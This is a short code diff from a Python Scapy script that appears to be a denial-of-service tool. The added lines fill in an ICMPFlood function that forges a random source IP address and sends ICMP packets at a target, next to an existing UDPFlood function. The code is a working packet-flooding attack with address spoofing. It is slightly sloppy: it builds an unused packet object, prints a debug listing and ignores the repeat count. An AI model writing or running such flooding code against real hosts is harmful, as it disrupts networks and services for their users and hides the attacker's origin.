@@ -66,7 +66,13 @@ def UDPFlood(dstIP,dstPort,repeat):
     send(IP_Packet/UDP_Packet,verbose=0)
 
 def ICMPFlood(dstIP,repeat):
-    pass
+    IP_Packet = IP()
+    IP_Packet.src = randomSrcIP()
+    IP_Packet.dst = dstIP
+
+    ICMP_Packet = ICMP()
+    ls(ICMP)
+    send(IP_Packet/ICMP(),verbose=0)
 
 
 main()
